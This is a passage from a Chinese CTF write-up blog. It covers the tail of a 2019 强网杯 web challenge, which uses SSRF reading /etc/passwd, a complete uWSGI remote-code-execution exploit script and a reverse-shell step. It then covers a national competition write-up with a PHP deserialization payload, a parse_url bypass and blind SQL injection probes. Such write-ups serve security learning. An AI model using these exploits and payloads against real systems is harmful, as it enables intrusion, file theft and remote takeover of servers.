<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">user.route(<span class="string">'/newimg'</span>, methods=[<span class="string">'POST'</span>,<span class="string">'GET'</span>])</span><br><span class="line">@login_required</span><br><span class="line">def test():</span><br><span class="line">    url = unquote(request.form.<span class="built_in">get</span>(<span class="string">'newurl'</span>))</span><br><span class="line">    <span class="keyword">if</span> re.match(<span class="string">"^[A-Za-z0-9-_%:./]*$"</span>,url):</span><br><span class="line">        filename = ramdom_str()</span><br><span class="line">        <span class="keyword">command</span> = <span class="string">"curl &#123;&#125; &gt; /tmp/&#123;&#125;"</span>.<span class="title">format</span>(<span class="title">url</span>, <span class="title">filename</span>)</span><br><span class="line">        os.<span class="keyword">system</span>(<span class="keyword">command</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"/tmp/&#123;&#125;"</span>.<span class="built_in">format</span>(filename),<span class="string">"rb"</span>) <span class="keyword">as</span> res:</span><br><span class="line">            res_data = res.<span class="built_in">read</span>()</span><br><span class="line">            res_data = base64.b64encode(res_data)</span><br><span class="line">            <span class="literal">return</span> res_data</span><br><span class="line">    <span class="literal">return</span> <span class="string">""</span></span><br></pre></td></tr></table></figure>
<p>所以构造下注入登入，然后ssrf一波就可以读文件了</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">URL：<span class="string">https:</span><span class="comment">//qqwwwwbbbbb.52dandan.xyz:8088/user/newimg</span></span><br><span class="line">POST：newurl=<span class="string">file:</span><span class="comment">//etc/passwd</span></span><br></pre></td></tr></table></figure>
<p>读nigix的配置文件后知道服务器配有uwsgi服务<br><img src="/2019/05/31/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E9%A2%98%E5%8F%8A%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/8418106-eaaba9cc243d97a9.jpg" alt title="图片"></p>
<p>github上有个uwsgi的RCE脚本</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="comment">######################</span></span><br><span class="line"><span class="comment"># Uwsgi RCE Exploit</span></span><br><span class="line"><span class="comment">######################</span></span><br><span class="line"><span class="comment"># Author: wofeiwo@80sec.com</span></span><br><span class="line"><span class="comment"># Created: 2017-7-18</span></span><br><span class="line"><span class="comment"># Last modified: 2018-1-30</span></span><br><span class="line"><span class="comment"># <span class="doctag">Note:</span> Just for research purpose</span></span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">import socket</span><br><span class="line">import argparse</span><br><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">def sz(x):</span><br><span class="line">    s = hex(x <span class="keyword">if</span> isinstance(x, int) <span class="keyword">else</span> len(x))[2:].rjust(4, <span class="string">'0'</span>)</span><br><span class="line">    <span class="keyword">if</span> sys.version_info[0] == 3: import bytes</span><br><span class="line">    s = bytes.fromhex(s) <span class="keyword">if</span> sys.version_info[0] == 3 <span class="keyword">else</span> s.decode(<span class="string">'hex'</span>)</span><br><span class="line">    return s[::-1]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pack_uwsgi_vars(var):</span><br><span class="line">    pk = b<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> var.items() <span class="keyword">if</span> hasattr(var, <span class="string">'items'</span>) <span class="keyword">else</span> var:</span><br><span class="line">        pk += sz(k) + k.encode(<span class="string">'utf8'</span>) + sz(v) + v.encode(<span class="string">'utf8'</span>)</span><br><span class="line">    result = b<span class="string">'\x00'</span> + sz(pk) + b<span class="string">'\x00'</span> + pk</span><br><span class="line">    # <span class="builtin-name">print</span>(urlencode(result))</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def parse_addr(addr, <span class="attribute">default_port</span>=None):</span><br><span class="line">   <span class="built_in"> port </span>= default_port</span><br><span class="line">    <span class="keyword">if</span> isinstance(addr, str):</span><br><span class="line">        <span class="keyword">if</span> addr.isdigit():</span><br><span class="line">            addr,<span class="built_in"> port </span>= <span class="string">''</span>, addr</span><br><span class="line">        elif <span class="string">':'</span> <span class="keyword">in</span> addr:</span><br><span class="line">            addr, _,<span class="built_in"> port </span>= addr.partition(<span class="string">':'</span>)</span><br><span class="line">    elif isinstance(addr, (list, tuple, set)):</span><br><span class="line">        addr,<span class="built_in"> port </span>= addr</span><br><span class="line">   <span class="built_in"> port </span>= int(port) <span class="keyword">if</span><span class="built_in"> port </span><span class="keyword">else</span> port</span><br><span class="line">    return (addr <span class="keyword">or</span> <span class="string">'127.0.0.1'</span>, port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_host_from_url(url):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'//'</span> <span class="keyword">in</span> url:</span><br><span class="line">        url = url.split(<span class="string">'//'</span>, 1)[1]</span><br><span class="line">    host, _, url = url.partition(<span class="string">'/'</span>)</span><br><span class="line">    return (host, <span class="string">'/'</span> + url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def fetch_data(uri, <span class="attribute">payload</span>=None, <span class="attribute">body</span>=None):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'http'</span> <span class="keyword">not</span> <span class="keyword">in</span> uri:</span><br><span class="line">        uri = <span class="string">'http://'</span> + uri</span><br><span class="line">    s = requests.Session()</span><br><span class="line">    # s.headers[<span class="string">'UWSGI_FILE'</span>] = payload</span><br><span class="line">    <span class="keyword">if</span> body:</span><br><span class="line">        import urlparse</span><br><span class="line">        body_d = dict(urlparse.parse_qsl(urlparse.urlsplit(body).path))</span><br><span class="line">        d = s.post(uri, <span class="attribute">data</span>=body_d)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        d = s.<span class="builtin-name">get</span>(uri)</span><br><span class="line"></span><br><span class="line">    return &#123;</span><br><span class="line">        <span class="string">'code'</span>: d.status_code,</span><br><span class="line">        <span class="string">'text'</span>: d.text,</span><br><span class="line">        <span class="string">'header'</span>: d.headers</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def ask_uwsgi(addr_and_port, mode, var, <span class="attribute">body</span>=<span class="string">''</span>):</span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">'tcp'</span>:</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect(parse_addr(addr_and_port))</span><br><span class="line">    elif mode == <span class="string">'unix'</span>:</span><br><span class="line">        s = socket.socket(socket.AF_UNIX)</span><br><span class="line">        s.connect(addr_and_port)</span><br><span class="line">    tmp = (pack_uwsgi_vars(var) + body.encode(<span class="string">'utf8'</span>))</span><br><span class="line">    <span class="attribute">tmp</span>=urllib.quote(tmp)</span><br><span class="line">    <span class="builtin-name">print</span>(tmp)</span><br><span class="line">    s.send(pack_uwsgi_vars(var) + body.encode(<span class="string">'utf8'</span>))</span><br><span class="line">    response = []</span><br><span class="line">    # Actually we dont need the response, it will block <span class="keyword">if</span> we <span class="builtin-name">run</span> any commands.</span><br><span class="line">    # So I comment all the receiving stuff. </span><br><span class="line">    # <span class="keyword">while</span> 1:</span><br><span class="line">    #     data = s.recv(4096)</span><br><span class="line">    #     <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">    #         break</span><br><span class="line">    #     response.append(data)</span><br><span class="line">    s.close()</span><br><span class="line">    return b<span class="string">''</span>.join(response).decode(<span class="string">'utf8'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def curl(mode, addr_and_port, payload, target_url):</span><br><span class="line">    host, uri = get_host_from_url(target_url)</span><br><span class="line">    path, _, qs = uri.partition(<span class="string">'?'</span>)</span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">'http'</span>:</span><br><span class="line">        return fetch_data(addr_and_port+uri, payload)</span><br><span class="line">    elif mode == <span class="string">'tcp'</span>:</span><br><span class="line">        host = host <span class="keyword">or</span> parse_addr(addr_and_port)[0]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host = addr_and_port</span><br><span class="line">    var = &#123;</span><br><span class="line">        <span class="string">'SERVER_PROTOCOL'</span>: <span class="string">'HTTP/1.1'</span>,</span><br><span class="line">        <span class="string">'REQUEST_METHOD'</span>: <span class="string">'GET'</span>,</span><br><span class="line">        <span class="string">'PATH_INFO'</span>: path,</span><br><span class="line">        <span class="string">'REQUEST_URI'</span>: uri,</span><br><span class="line">        <span class="string">'QUERY_STRING'</span>: qs,</span><br><span class="line">        <span class="string">'SERVER_NAME'</span>: host,</span><br><span class="line">        <span class="string">'HTTP_HOST'</span>: host,</span><br><span class="line">        <span class="string">'UWSGI_FILE'</span>: payload,</span><br><span class="line">        <span class="string">'SCRIPT_NAME'</span>: target_url</span><br><span class="line">    &#125;</span><br><span class="line">    return ask_uwsgi(addr_and_port, mode, var)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main(<span class="number">*a</span>rgs):</span><br><span class="line">    desc = <span class="string">""</span><span class="string">"</span></span><br><span class="line"><span class="string">    This is a uwsgi client &amp; RCE exploit.</span></span><br><span class="line"><span class="string">    Last modifid at 2018-01-30 by wofeiwo@80sec.com</span></span><br><span class="line"><span class="string">    "</span><span class="string">""</span></span><br><span class="line">    elog = <span class="string">"Example：uwsgi_exp.py -u 1.2.3.4:5000 -c \"echo 111&gt;/tmp/abc\""</span></span><br><span class="line">    </span><br><span class="line">    parser = argparse.ArgumentParser(<span class="attribute">description</span>=desc, <span class="attribute">epilog</span>=elog)</span><br><span class="line"></span><br><span class="line">    parser.add_argument(<span class="string">'-m'</span>, <span class="string">'--mode'</span>, <span class="attribute">nargs</span>=<span class="string">'?'</span>, <span class="attribute">default</span>=<span class="string">'tcp'</span>,</span><br><span class="line">                        <span class="attribute">help</span>=<span class="string">'Uwsgi mode: 1. http 2. tcp 3. unix. The default is tcp.'</span>,</span><br><span class="line">                        <span class="attribute">dest</span>=<span class="string">'mode'</span>, choices=[<span class="string">'http'</span>, <span class="string">'tcp'</span>, <span class="string">'unix'</span>])</span><br><span class="line"></span><br><span class="line">    parser.add_argument(<span class="string">'-u'</span>, <span class="string">'--uwsgi'</span>, <span class="attribute">nargs</span>=<span class="string">'?'</span>, <span class="attribute">required</span>=<span class="literal">True</span>,</span><br><span class="line">                        <span class="attribute">help</span>=<span class="string">'Uwsgi server: 1.2.3.4:5000 or /tmp/uwsgi.sock'</span>,</span><br><span class="line">                        <span class="attribute">dest</span>=<span class="string">'uwsgi_addr'</span>)</span><br><span class="line"></span><br><span class="line">    parser.add_argument(<span class="string">'-c'</span>, <span class="string">'--command'</span>, <span class="attribute">nargs</span>=<span class="string">'?'</span>, <span class="attribute">required</span>=<span class="literal">True</span>,</span><br><span class="line">                        <span class="attribute">help</span>=<span class="string">'Command: The exploit command you want to execute, must have this.'</span>,</span><br><span class="line">                        <span class="attribute">dest</span>=<span class="string">'command'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; 2:</span><br><span class="line">        parser.print_help()</span><br><span class="line">        return</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> args.mode.lower() == <span class="string">"http"</span>:</span><br><span class="line">        <span class="builtin-name">print</span>(<span class="string">"[-]Currently only tcp/unix method is supported in RCE exploit."</span>)</span><br><span class="line">        return</span><br><span class="line">    payload = <span class="string">'exec://'</span> + args.command + <span class="string">"; echo test"</span> # must have someting <span class="keyword">in</span> output <span class="keyword">or</span> the uWSGI crashs.</span><br><span class="line">    # <span class="builtin-name">print</span>(payload)</span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">"[*]Sending payload."</span>)</span><br><span class="line">    <span class="builtin-name">print</span> payload</span><br><span class="line">    <span class="builtin-name">print</span>(curl(args.mode.lower(), args.uwsgi_addr, payload, <span class="string">'/testapp'</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>打印出gohper，通过ssrf用python的反弹shell操作打一波3031端口就好了，就可以拿到shell（继续盗bertram图）<br><img src="/2019/05/31/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E9%A2%98%E5%8F%8A%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/8418106-a4b2af8b04d85f1d.jpg" alt title="图片"><br><img src="http://upload-images.jianshu.io/upload_images/8418106-914eeb834f1b33b6?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
<p>提示有socks代理，扫一波发现172.16.17.4有1080端口，所以做个代理就好了，师傅们都用ew的，这个就不介绍了，转发出来了就直接用公网打就好了，并且官方最后公布了内网服务的源码，其实在内网的时候有着各个师傅们搭好的路，直接抄作业就好了，2333，执行流程应该是是（改bertram表述），构造反序列化payload<br>User 1 -&gt; POST /adduser username=payload&amp;password=<br>User 1 -&gt; /savelog 修改 User2 session<br>User 2 -&gt; 登录触发反序列化<br>User 2 -&gt; getflag<br>（最后的我没测，打完就跑路了，被自己菜哭了）</p>
<h1 id="0x06-babywp"><a href="#0x06-babywp" class="headerlink" title="0x06 babywp"></a>0x06 babywp</h1><p>webpwn，果断放弃，看官方WP就好了</p>
]]></content>
      <categories>
        <category>Cyc1e的CTF之路</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>反序列化</tag>
        <tag>SQL</tag>
        <tag>uwsgi</tag>
      </tags>
  </entry>
  <entry>
    <title>2019 全国大学生信息安全竞赛创新能力实践赛3道Web Writeup</title>
    <url>/2019/04/23/2019-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E8%83%BD%E5%8A%9B%E5%AE%9E%E8%B7%B5%E8%B5%9B3%E9%81%93Web-Writeup/</url>
    <content><![CDATA[<h3 id="0x01-JustSoso"><a href="#0x01-JustSoso" class="headerlink" title="0x01 JustSoso"></a>0x01 JustSoso</h3><p>本题的主要知识点在于反序列化的应用和parse_url()函数的解析问题，首先通过网页源码中的文件读取提示读取得到index.php文件源码和hint文件源码，任意文件读取就不做介绍了。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">#index.php</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>); </span></span><br><span class="line"><span class="php">$file = $_GET[<span class="string">"file"</span>]; </span></span><br><span class="line"><span class="php">$payload = $_GET[<span class="string">"payload"</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!<span class="keyword">isset</span>($file))&#123;</span></span><br><span class="line"><span class="php">	<span class="keyword">echo</span> <span class="string">'Missing parameter'</span>.<span class="string">'&lt;br&gt;'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span></span><br><span class="line"><span class="php">	<span class="keyword">die</span>(<span class="string">'hack attacked!!!'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">@<span class="keyword">include</span>($file);</span></span><br><span class="line"><span class="php">print_r($payload);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($payload))&#123;  </span></span><br><span class="line"><span class="php">    $url = parse_url($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span></span><br><span class="line"><span class="php">    parse_str($url[<span class="string">'query'</span>],$query);</span></span><br><span class="line"><span class="php">    <span class="keyword">foreach</span>($query <span class="keyword">as</span> $value)&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (preg_match(<span class="string">"/flag/"</span>,$value)) &#123; </span></span><br><span class="line"><span class="php">    	    <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>);</span></span><br><span class="line"><span class="php">    	    <span class="keyword">exit</span>();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    $payload = unserialize($payload);</span></span><br><span class="line"><span class="php">&#125;<span class="keyword">else</span>&#123; </span></span><br><span class="line"><span class="php">   <span class="keyword">echo</span> <span class="string">"Missing parameters"</span>; </span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="comment">&lt;!--Please test index.php?file=xxx.php --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--Please get the source of hint.php--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#hint.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $handle;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Waking up\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = $handle;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle-&gt;getFlag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> $token_flag;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>, <span class="number">10000</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>, <span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在index.php中的反序列化函数unserialize()加上hint.php文件，很显然是通过反序列化的方式来读取flag.php文件，先不看unserialize()前的过滤规则，对hint.php进行序列化构造。而在hint.php文件中，主要触发echo @highlight_file($this-&gt;file, true)，而触发要解决的主要是 $this-&gt;token == $this-&gt;token_flag的问题，实例化Handle后，$handle是可控的，并且类Handle中的魔术方法__destruct会触发Flag类中的getFlag()函数所以我们只需要利用$handle来给Flag类中的变量赋值即可。而对于token和token_flag值的比较，可以采用引用的方法进行绕过，即$this-&gt;token = &amp;$this-&gt;token_flag;所以最终构造为：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">private</span> $handle;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">foreach</span> (get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"Waking up\n"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;handle = $handle;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;handle-&gt;getFlag();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $file;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $token;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $token_flag;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;file = $file;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>, <span class="number">10000</span>));</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>, <span class="number">10000</span>));</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>);</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$Flag = <span class="keyword">new</span> Flag();</span></span><br><span class="line"><span class="php">$Flag-&gt;file = <span class="string">"flag.php"</span>;</span></span><br><span class="line"><span class="php">$Flag-&gt;token = &amp;$Flag-&gt;token_flag;</span></span><br><span class="line"><span class="php">$test = <span class="keyword">new</span> Handle($Flag);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> urlencode(serialize($test));</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>生成序列化数据，由于序列化后有不可见字符，所以利用urlencode函数进行编码输出为</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">O%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>Handle%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Handle%<span class="number">00</span>handle%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>Flag%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22f</span>ile%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22f</span>lag.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>token%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A32%<span class="number">3</span>A%<span class="number">2262e7f</span>2e090fe150ef8deb4466fdc81b3%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>token_flag%<span class="number">22</span>%<span class="number">3</span>BR%<span class="number">3</span>A4%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>
<p>本地测试成功后，接下来就是绕过index.php文件中的过滤代码：</p>
<p><img src="/2019/04/23/2019-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E8%83%BD%E5%8A%9B%E5%AE%9E%E8%B7%B5%E8%B5%9B3%E9%81%93Web-Writeup/8418106-fd7dd48f508be3a5.png" alt></p>
<p>取出域名后完整地址路劲传递给变量%url,其实也就是只要参数中，即序列化数据中存在flag字符就die了，这里利用parse_url函数的解析特性，即利用’///’进行绕过$url过滤，parse_url函数解析’///‘时会返回false，从而可以直接绕过过滤规则，最后在绕一下__wakeup函数就好了，最终payload为：<a href="http://84e854e3a8db40e29b9958ff3e816a31f8a75c76067c4667.changame.ichunqiu.com///?file=hint.php&amp;payload=O%3A6%3A%22Handle%22%3A2%3A%7Bs%3A14%3A%22%00Handle%00handle%22%3BO%3A4%3A%22Flag%22%3A3%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A5%3A%22token%22%3Bs%3A32%3A%2264d52e08cc03e6090bc1ef30b73ccb85%22%3Bs%3A10%3A%22token_flag%22%3BR%3A4%3B%7D%7D" target="_blank" rel="noopener">http://84e854e3a8db40e29b9958ff3e816a31f8a75c76067c4667.changame.ichunqiu.com///?file=hint.php&amp;payload=O%3A6%3A%22Handle%22%3A2%3A%7Bs%3A14%3A%22%00Handle%00handle%22%3BO%3A4%3A%22Flag%22%3A3%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A5%3A%22token%22%3Bs%3A32%3A%2264d52e08cc03e6090bc1ef30b73ccb85%22%3Bs%3A10%3A%22token_flag%22%3BR%3A4%3B%7D%7D</a></p>
<p><img src="/2019/04/23/2019-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E8%83%BD%E5%8A%9B%E5%AE%9E%E8%B7%B5%E8%B5%9B3%E9%81%93Web-Writeup/8418106-6aae6fdb89c927a4.png" alt></p>
<p><strong>FLAG值：</strong>flag{7e4d5d48-44a9-4a91-b6aa-bd6b659d1bde}</p>
<h3 id="0x02-全宇宙最简单的SQL"><a href="#0x02-全宇宙最简单的SQL" class="headerlink" title="0x02 全宇宙最简单的SQL"></a>0x02 全宇宙最简单的SQL</h3><p>既然是SQL注入，那么首先肯定是先查看注入点，fuzz发现过滤or、if等，并且能够判断当我们输入的payload能够拼接出的SQL语句执行成功时，网页返回的是“登陆失败”，而当拼接出的SQL语句执行错误时，网页返回“数据库操作失败”<br>所以，使用pow函数以及&amp;&amp;构造sql语句进行判断</p>
<blockquote>
<p>a’ &amp;&amp; 1=1 &amp;&amp; pow(9.99999999)<br>a’ &amp;&amp; 1=2 &amp;&amp; pow(9.99999999)</p>
</blockquote>
